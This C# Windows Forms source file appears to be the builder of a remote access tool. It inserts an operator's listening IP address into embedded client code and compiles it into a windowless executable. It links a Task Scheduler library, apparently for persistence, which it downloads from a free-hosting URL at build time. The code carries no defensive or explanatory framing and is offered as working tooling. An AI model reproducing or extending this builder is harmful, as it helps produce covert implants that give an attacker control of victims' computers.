using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp8
{
    public partial class BuildClientProgram : Form
    {
        string MainFormIpAddress;
        public BuildClientProgram(TextBox HostValue)
        {
            InitializeComponent();
            this.TopMost = true;
            this.IpAddress.Text = HostValue.Text;
            this.MainFormIpAddress = HostValue.Text;
        }

        private void button_Click(object sender, EventArgs e)
        {
            if(IpAddress.Text != MainFormIpAddress)
                MessageBox.Show("NOTICE - Your trying to create a client host on a host that your not listening to. MAKE SURE THAT ITS YOUR PUBLIC IP AND YOU OPENED A PORT FOR IT.");

            if(IpAddress.Text == "")
            {
                MessageBox.Show("ERROR - ipaddress cannot be empty.");
                return;
            }

            string path = default(string);
            using (SaveFileDialog saveFileDialog = new SaveFileDialog())
            {
                saveFileDialog.Filter = "Executable(*.exe) | *.exe";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    if (!saveFileDialog.CheckPathExists)
                    {
                        MessageBox.Show("The path you typed is not exist.");
                        return;
                    }

                    path = saveFileDialog.FileName;
                }
            }

            BuildTo(path);
        }
        
        private void BuildTo(string output)
        {
            if (output == null)
            {
                MessageBox.Show("ERROR - Please select a valid path");
                return;
            }

            string source = PrepareSource(Properties.Resources.CompiledCode); // changing some info on our compiled string

            // references
            string[] assemblies = new string[] {
            "System.dll",
            "System.Core.dll",
            "System.XML.dll"
        };

            // .net framework version
            Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

            // compiler settings
            // set it to be a windows executable file
            // set platform to work for 32 and 64bit
            // optimizes source code
            string compilerSettings = "/t:winexe /platform:anycpu /optimize+";

            using (CSharpCodeProvider cSharpCode = new CSharpCodeProvider(providerOptions))
            {
                CompilerParameters compilerParameters = new CompilerParameters(assemblies)
                {
                    GenerateExecutable = true,
                    GenerateInMemory = false,
                    OutputAssembly = output, // Specify the path where the compiled exe will be saved
                    CompilerOptions = compilerSettings,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };

                CompilerResults results;
                compilerParameters.ReferencedAssemblies.Add(@"Microsoft.Win32.TaskScheduler.dll");
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(@"https://mysimpleweb054.000webhostapp.com/mysite/4", "Microsoft.Win32.TaskScheduler.dll");
                    results = cSharpCode.CompileAssemblyFromSource(compilerParameters, source); // compile the source that we specified
                    File.Delete("Microsoft.Win32.TaskScheduler.dll");
                }
                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError err in results.Errors)
                    {
                        MessageBox.Show(string.Format("{0} - in Line: {1}", err.ErrorText, err.Line));
                    }
                    return;
                }
                else
                {
                    MessageBox.Show(String.Format("Compiled! You can find the file in {0}", output));
                }
            }
        }

        private string PrepareSource(string source)
        {
            source = source.Replace("%IPADDRESS%", IpAddress.Text);
            return source;
        }
    }
}